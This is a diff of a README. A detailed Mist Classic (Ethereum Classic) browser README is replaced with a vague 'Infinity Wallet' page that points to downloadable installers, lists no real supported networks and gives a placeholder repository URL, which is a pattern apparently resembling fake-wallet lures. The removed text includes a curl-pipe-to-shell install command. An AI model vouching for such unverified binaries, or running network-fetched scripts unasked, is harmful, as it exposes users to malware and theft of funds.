@@ -1,204 +1,176 @@
-# Mist Classic Browser
+# Infinity Wallet
 
-Mist Classic browser and wallet is a modified version of the [Mist](https://github.com/ethereum/mist) client restored to work with the original/classic chain. This client is maintained by the Ethereum Classic Project, the project that does not hardcode exceptions to the premise of unstoppable code. Ethereum Classic Project ensures unstoppable, censorship-resistant applications operating on a neutral world computer.
+### The secure, open-source desktop cryptocurrency wallet
 
-**LOOKING FOR MAINTAINERS**
+**Take control of your digital assets with Infinity Wallet — a modern desktop wallet designed to make cryptocurrency management simple, secure, and accessible.**
 
-**Project is compatible with ETC, but is not maintained. Mist has some issues with Windows #151 and doesn't have a build for Linux #35. If you're a JS developer with Windows or Linux, please take a look at this issues**
+Infinity Wallet is a cryptocurrency wallet project focused on providing users with a convenient way to manage their digital assets through an intuitive desktop application. Built with an emphasis on security, usability, and transparency, Infinity Wallet aims to deliver a seamless experience for both new and experienced cryptocurrency users.
 
-**NOTICE The project is going to be replaced with Emerald Wallet, which is currently under development.**
+Our goal is to create a reliable wallet ecosystem that puts users in control of their digital assets and provides the tools needed to interact with the evolving blockchain landscape.
 
+[Platform](#downloads) · [Latest Release](../../releases) · [Open Source](#security) · [License](LICENSE)
 
-[![Join the chat at https://gitter.im/ethereumproject/mist](https://badges.gitter.im/Join%20Chat.svg)](#TBD)
-[![Build status master branch ](https://build.ethdev.com/buildstatusimage?builder=Mist%20master%20branch)](#TBD)
-[![Build status develop branch ](https://build.ethdev.com/buildstatusimage?builder=Mist%20develop%20branch)](#TBD)
+---
 
-The Mist(classic) browser is the tool of choice to browse and use Ðapps.
+## 📥 Downloads
 
-For the Mist API see the [MISTAPI.md](MISTAPI.md).
+Download Infinity Wallet for your preferred operating system.
 
-## Installation
+| **Platform** | **File** | **Requires** |
+|---|---|---|
+| 🪟 Windows 10/11 | `Infinity-Wallet-Setup.exe` | Windows 10 or later |
+| 🍎 macOS | `Infinity-Wallet.dmg` | Compatible macOS version |
+| 🐧 Linux | `Infinity-Wallet-Linux.zip` | 64-bit Linux |
 
-If you want install the app from a pre-built version on the [release page](https://github.com/ethereumproject/mist/releases),
-you can simply run the executeable after download.
+👉 All available versions and release notes: [**Releases page**](../../releases)
 
-For updating simply download the new version and copy it over the old one (keep a backup of the old one if you want to be sure).
-The data folder for Mist is stored in other places:
+---
 
-- Windows `%APPDATA%\Mist`
-- MacOSX `~/Library/Application Support/Mist`
-- Linux `~/.config/Mist`
+## 🚀 Install
 
+**Windows**
 
-## Development
+1. Download the latest Infinity Wallet installer.
+2. Run the installer and follow the setup instructions.
+3. Launch Infinity Wallet from the Start Menu or Desktop shortcut.
 
-For development, a Meteor server will to be started to assist with live reload and CSS injection.
-Once a Mist version is released the Meteor frontend part is bundled using `meteor-build-client` npm package to create pure static files.
+**macOS**
 
-### Dependencies
+1. Download the latest macOS package.
+2. Open the downloaded `.dmg` file.
+3. Move Infinity Wallet into your Applications folder.
+4. Launch the application.
 
-Requirements:
+**Linux**
 
-* Electron v1.2.5
-* Node v4.3.0 or above
+1. Download the latest Linux package.
+2. Extract the downloaded archive.
+3. Follow the included installation instructions.
+4. Launch Infinity Wallet.
 
-To run mist in development you need [Node.js NPM](https://nodejs.org) and [Meteor](https://www.meteor.com/install) and electron installed:
+---
 
-    $ curl https://install.meteor.com/ | sh
-    $ npm install -g electron-prebuilt@1.2.5
-    $ npm install -g gulp
+## ✨ What You Get
 
-### Installation
+- **Intuitive Interface** — A clean and user-friendly environment for managing your cryptocurrency assets.
+- **Self-Custody** — Maintain control over your wallet and private keys.
+- **Wallet Recovery** — Restore access to your wallet using your recovery phrase.
+- **Asset Management** — Manage supported digital currencies from one convenient interface.
+- **Transaction Management** — Send and receive supported cryptocurrencies.
+- **Security-Focused Design** — Built with an emphasis on protecting sensitive wallet information.
+- **Desktop Experience** — A dedicated application designed for desktop operating systems.
+- **Continuous Development** — Ongoing improvements, updates, and new features.
 
-Now you're ready to install Mist:
+---
 
-    $ git clone https://github.com/ethereumproject/mist.git
-    $ cd mist
-    $ git submodule update --init
-    $ npm install
-    $ gulp update-nodes
+## 🌐 Supported Networks
 
-To update Mist in the future, run:
+Infinity Wallet is designed to support cryptocurrency networks and digital assets.
 
-    $ cd mist
-    $ git pull && git submodule update
-    $ npm install
-    $ gulp update-nodes
+Supported networks and assets will be documented as integrations become available.
 
+| **Network** | **Asset** | **Status** |
+|---|---|---|
+| To be announced | To be announced | Coming soon |
 
-### Run Mist
+---
 
-For development we start the interface with a Meteor server for autoreload etc.
-*Start the interface in a separate terminal window:*
+## 🗂 Where Things Live
 
-    $ cd mist/interface && meteor
+Infinity Wallet stores application data and configuration files locally.
 
-In the original window you can then start Mist with:
+Specific storage locations may vary depending on your operating system and application version.
 
-    $ cd mist
-    $ electron .
+| **What** | **Description** |
+|---|---|
+| Configuration | Application preferences and settings |
+| Wallet Data | Locally stored wallet information |
+| Logs | Application diagnostic information |
+| Backups | User-created wallet backups |
 
+---
 
-### Run the Wallet
+## 🔐 Security
 
-Start the wallet app for development, *in a separate terminal window:*
+Security and user privacy are important priorities in the development of Infinity Wallet.
 
-    $ cd mist/interface && meteor
+- Your recovery phrase and private keys should always remain confidential.
+- Never share your recovery phrase with anyone.
+- Never enter your recovery phrase on untrusted websites.
+- Download application releases only from official project channels.
+- Verify release information before installing updates.
+- Keep secure offline backups of your recovery phrase.
 
-    // and in another terminal
+**Important:** Anyone with access to your recovery phrase may be able to access your cryptocurrency funds. Infinity Wallet will never ask you to disclose your recovery phrase through unofficial support channels.
 
-    $ cd my/path/meteor-dapp-wallet/app && meteor --port 3050
+---
 
-In the original window you can then start Mist using wallet mode:
+## 🛠 Development
 
-    $ cd mist
-    $ electron . --mode wallet
+We welcome developers, contributors, and members of the open-source community interested in the development of Infinity Wallet.
 
+### Getting Started
 
-### Passing options to Geth/Eth
-
-You can pass command-line options directly to Geth/Eth by prefixing them
-with `--node-`:
+Clone the repository:
 
 ```bash
-$ electron . --mode mist --node-rpcport 19343 --node-networkid 2
+git clone https://github.com/INFINITY-ORGANIZATION/INFINITY-REPOSITORY.git
 ```
 
-
-### Using Mist with a privatenet
-
-To run a private network you will need to set the `networkdid`, `ipcpath` and
-`datadir` flags:
+Navigate to the project directory:
 
 ```bash
-$ electron . --ipcpath ~/Library/Ethereum/geth.ipc --node-networkid 1234  --node-datadir ~/Library/Ethereum/privatenet
+cd INFINITY-REPOSITORY
 ```
 
-_NOTE: since `ipcpath` is also a Mist option you do not need to also include a
-`--node-ipcpath` option._
+Install the required dependencies and follow the build instructions provided in the project documentation.
 
-You can also run `geth` separately yourself with the same options prior to start
-Mist normally.
+### Contributing
 
+We appreciate contributions that help improve Infinity Wallet.
 
-### Deployment
+You can contribute by:
 
+- Reporting bugs and unexpected behavior.
+- Suggesting new features and improvements.
+- Submitting pull requests.
+- Improving documentation.
+- Helping test new releases.
 
-To create a binaries you need to install the following tools:
+Please review the project's contribution guidelines before submitting changes.
 
-    // tools for the windows binaries
-    $ brew install Caskroom/cask/xquartz
-    $ brew install wine
-    $ npm install -g meteor-build-client
+---
 
-To generate the binaries simply run:
+## 📦 Technology
 
-    $ cd mist
-    $ gulp update-nodes
+Infinity Wallet development focuses on modern software technologies and tools.
 
-    // to generate mist
-    $ gulp mist
+The exact technology stack, dependencies, and architecture are documented within the individual project repositories.
 
-    // Or to generate the wallet (using the https://github.com/ethereumproject/meteor-dapp-wallet -> master)
-    $ gulp wallet
+---
 
-This will generate the binaries inside the `dist_mist` or `dist_wallet` folder.
+## 💬 Support
 
-#### Options
+Have a question, found a bug, or want to suggest a feature?
 
-##### platform
+- **Issues:** [GitHub Issues](../../issues)
+- **Discussions:** [GitHub Discussions](../../discussions)
+- **Releases:** [Latest Releases](../../releases)
 
-Additional you can only build the windows, linux or mac binary by using the `platform` option:
+For security-related concerns, please use the project's designated security reporting channel rather than publishing sensitive vulnerability details in public issues.
 
-    $ gulp update-nodes --platform darwin
+---
 
-    // And
-    $ gulp mist --platform darwin
+## 📄 License
 
-    // Or
-    $ gulp mist --platform "darwin win32"
+See the [LICENSE](LICENSE) file for licensing information.
 
+---
 
-Options are:
+# Build with Infinity!
 
-- `darwin` (Mac OSX)
-- `win32` (Windows)
-- `linux` (Linux)
+We believe in creating accessible, reliable, and user-focused cryptocurrency software.
 
+Whether you are a developer, contributor, or cryptocurrency enthusiast, you are welcome to follow the development of Infinity Wallet and help shape its future.
 
-##### walletSource
-
-With the `walletSource` you can specify the branch to use, default ist `master`:
-
-    $ gulp mist --walletSource develop
-
-
-Options are:
-
-- `master`
-- `develop`
-- `local` Will try to build the wallet from [mist/]../meteor-dapp-wallet/app
-
-##### mist-checksums | wallet-checksums
-
-Spits out the SHA256 checksums of zip files. The zip files need to be generated manually for now!
-It expects zip files to be named as the generated folders e.g. `dist_wallet/Ethereum-Wallet-macosx-0-5-0.zip`
-
-    $ gulp mist-checksums
-
-    > SHA256 Ethereum-Wallet-linux32-0-5-0.zip: 983dc9f1bc14a17a46f1e34d46f1bfdc01dc0868
-    > SHA256 Ethereum-Wallet-win32-0-5-0.zip: 1f8e56c198545c235d47921888e5ede76ce42dcf
-    > SHA256 Ethereum-Wallet-macosx-0-5-0.zip: dba5a13d6114b2abf1d4beca8bde25f1869feb45
-    > SHA256 Ethereum-Wallet-linux64-0-5-0.zip: 2104b0fe75109681a70f9bf4e844d83a38796311
-    > SHA256 Ethereum-Wallet-win64-0-5-0.zip: fc20b746eb37686edb04aee3e442492956adb546
-
-### Code signing for production
-
-After the bundle run:
-
-    $ codesign --deep --force --verbose --sign "5F515C07CEB5A1EC3EEB39C100C06A8C5ACAE5F4" Ethereum-Wallet.app
-
-Verify
-
-    $ codesign --verify -vvvv Ethereum-Wallet.app
-    $ spctl -a -vvvv Ethereum-Wallet.app
+**Infinity Wallet — Your Assets. Your Control. Your Infinity.**
